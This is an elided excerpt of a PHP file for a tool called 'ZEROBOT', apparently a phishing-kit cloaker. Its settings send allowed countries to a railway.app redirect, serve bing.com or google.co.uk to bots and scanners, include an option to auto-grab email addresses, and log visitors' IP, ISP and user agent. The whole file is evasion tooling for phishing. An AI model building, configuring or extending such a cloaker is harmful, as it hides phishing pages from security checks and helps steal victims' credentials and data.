...
/*
    ...
    *** Version 4  Official Version ***
*/

$license_key = "gzd7ig7t0mny0d01grbtpw7xdqx5c6vv"; // [REQUIRED]

$redirect = "https://urlsand.esvalabs.com/?u=https%3A%2F%2Fshapofd8c2f3-6738-4b04-a776.up.railway.app&e=3fede6b7&h=506c30bf&f=y&p=y?x0bFqfjnA9lkOEQohfOPq0cpG4zdWP2a8LvSZZmRTnNPlRrKhuD68xOVeMDwY9JR1g8IjxdvkMYypDiABj7oku0CUJHuoWKpo2J1iQsrnwsfSbLL"; // URL or FILE [REQUIRED]
...
$_COUNTRY_ALLOWED = ["ma", "fr", "ca", "mx", "uk", "za", "ng", "tr", "at", "be", "bg", "hr", "cy", "cz", "dk", "ee", "fl", "fr", "de", "gr", "hu", "ie", "it", "lv", "lt", "lu", "mt", "nl", "pl", "pt", "ro", "sk", "sl", "es", "se", "is", "li", "no", "ch", "al", "ba", "md", "me", "mk", "rs", "ua", "ad", "by", "mc", "ru", "sm", "gb", "va", "kw"]; # Add Allowed Country Here , Country ISO code must be lowercase. [REQUIRED]
...
$cloaker = [
    "url_to_grab" => "https://bing.com", // Change the link you want to grap it in your link ( if t)
];

$auto_grabber = false; // Activate Auto Grab Email

$location_bots = "https://google.co.uk"; // Send The Bots To This Link ( If Cloaker Url Empty )
...
class ZEROBOT
{
    ...
    public function _AUTO_REMOVE_HTACCESS()
    {
    ...
    public function write_vues($check)
    {
        ...
        $data_to_put =
            ...
            ".webp'>$country</td><td><b><p style='color:$color'>$check</p></b></td><td><button type='button' username='{$this->username}' hostname='$hostname' ip='$ip_address' useragent='{$this->useragent}' isp='$isp' id='button-submit' class='text-white btn btn-danger btn-sm m-1'><span class='cil-contrast'></span>Report</button></td></tr>";
        if ($this->rm_db) {
